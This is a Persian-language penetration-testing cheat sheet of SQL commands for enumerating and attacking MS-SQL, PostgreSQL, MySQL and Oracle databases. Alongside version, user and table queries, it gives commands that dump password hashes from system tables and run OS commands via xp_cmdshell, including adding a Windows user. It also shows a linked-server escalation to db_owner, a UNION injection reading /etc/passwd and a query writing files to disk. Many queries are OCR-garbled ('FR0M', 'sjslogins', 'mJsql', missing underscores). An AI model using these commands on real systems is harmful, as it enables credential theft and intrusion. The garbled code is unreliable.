# پایگاه داده

Ms-sql

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">SELECT @@version</td>
      <td style="text-align:left">نسخه پایگاه داده</td>
    </tr>
    <tr>
      <td style="text-align:left">EXEC xp_msver</td>
      <td style="text-align:left">جزییات نسخه</td>
    </tr>
    <tr>
      <td style="text-align:left">EXEC master..xp_cmdshell &apos;net user&apos;</td>
      <td style="text-align:left">اجرا دستور سیستم عامل</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT HOST_ NAME()</td>
      <td style="text-align:left">دریافت Hostname و IP</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT DB_ NAME()</td>
      <td style="text-align:left">پایگاه داده فعلی</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM master..sysdatabases;</td>
      <td style="text-align:left">لیست پایگاه داده ها</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT user name()</td>
      <td style="text-align:left">کاربر فعلی</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM master .. sjslogins</td>
      <td style="text-align:left">لیست کاربران</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>SELECT name FROM master..sysobjects WHERE</p>
        <p>xtype= &apos;U&apos;;</p>
      </td>
      <td style="text-align:left">لیست جدول ها</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p></p>
        <p>SELECT name FROM syscolumns WHERE id=(SELECT</p>
        <p>id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ;</p>
      </td>
      <td style="text-align:left">لیست ستون ها</td>
    </tr>
  </tbody>
</table>

### اطلاعات درباره تمام جدول های پایگاه داده در جدول سیستم

```text
SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES
```

### لیست جدول و ستون ها

```text
SELECT name FROM Syscolumns WHERE id
(SELECT id FROM Sysobjects WHERE
name= 'mytable')
```

### هش کلمه عبور 

```text
SELECT name, password hash FROM master.sys.sgl_logins
```

### دور زدن سطح دسترسی کاربر

```text
execute('execute(''alter role [db_owner] add member [client]'') at "compatibility\poo_public"')
```

## Postgres

| **دستور** | **توضیح** |
| :--- | :--- |
| SELECT version\(\); | نسخه پایگاه داده |
| SELECT inet server\_addr\(\) | دریافت Hostname و IP |
| SELECT current database\(\); | پایگاه داده فعلی |
| SELECT datname FROM pg database; | لیست پایگاه داده |
| SELECT user; | کاربر جاری |
| SELECT username FROM pg\_user; | لیست کاربران |
| SELECT username,passwd FROM pg shadow | لیست هش کلمه عبور |

### لیست ستون

```text
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,
pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttjpid=T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')
```

### لیست جدول ها

```text
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
pg catalog.pg namespace n ON n.oid = c.relnamespace WHERE c.relkind IN
( 'r',") AND n.nspname NOT IN ( 'pg catalog', 'pg toast') AND
pg_catalog.pg_table_is_visible(c.oid)
```

## Mysql

| **دستور** | **توضیح** |
| :--- | :--- |
| SELECT @@version; | نسخه پایگاه دااده |
| SELECT @@hostname; | دریافت Hostname و IP |
| SELECT database\(\); | پایگاه داده فعلی |
| SELECT distinct \(db\) FROM mysql.db; | لیست پایگاه داده ها |
| SELECT user\(\); | کاربر فعلی |
| SELECT user FROM mysql.user; | لیست کاربران |
| SELECT host,user,password FROM mJsql.user; | لیست هش کلمه عبور ها |

### لیست تمامی جداول و ستون ها

```text
SELECT table schema, table name, column_ name FR0M
information scherna.columns WHERE
table schema != 'mysql' AND table schema != 'information schema'
```

### اجرای دستور سیستم عامل در mysql

```text
osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell `net user /add user
passr`"
```

### خواندن فایلی های خواندنی در mysql

```text
UNION ALL SELECT LOAD FILE( '/etc/passwd');
```

### نوشتن در فایل سیستم در mysql

```text
SELECT * FROM mytable INTO dumpfile '/tmp/ somefile';
```

## Oracle 

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>دستور</b>
      </th>
      <th style="text-align:left"><b>توضیح</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">SELECT * FROM v$version;</td>
      <td style="text-align:left">نسخه پایگاه داده</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT version FROM v$instance;</td>
      <td style="text-align:left">نسخه پایگاه داد</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT instance name FROM v$instance;</td>
      <td style="text-align:left">پایگاه داده فعلی</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name FROM v$database;</td>
      <td style="text-align:left">پایگاه داده فعلی</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT DISTINCT owner FROM all_tables;</td>
      <td style="text-align:left">لیست پایگاه داده ها</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT user FROM dual;</td>
      <td style="text-align:left">کاربر فعلی</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>SELECT username FROM all_users ORDER BY</p>
        <p>username;</p>
      </td>
      <td style="text-align:left">لیست کابران</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT column name FROM all_tab_columns;</td>
      <td style="text-align:left">لیست ستون ها</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT table name FROM all_tables;</td>
      <td style="text-align:left">لیست جدول ها</td>
    </tr>
    <tr>
      <td style="text-align:left">SELECT name, password, astatus FROM sys.user$;</td>
      <td style="text-align:left">لیست هش کلمه عبور ها</td>
    </tr>
  </tbody>
</table>

### لیست پایگاه های داده

```text
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```
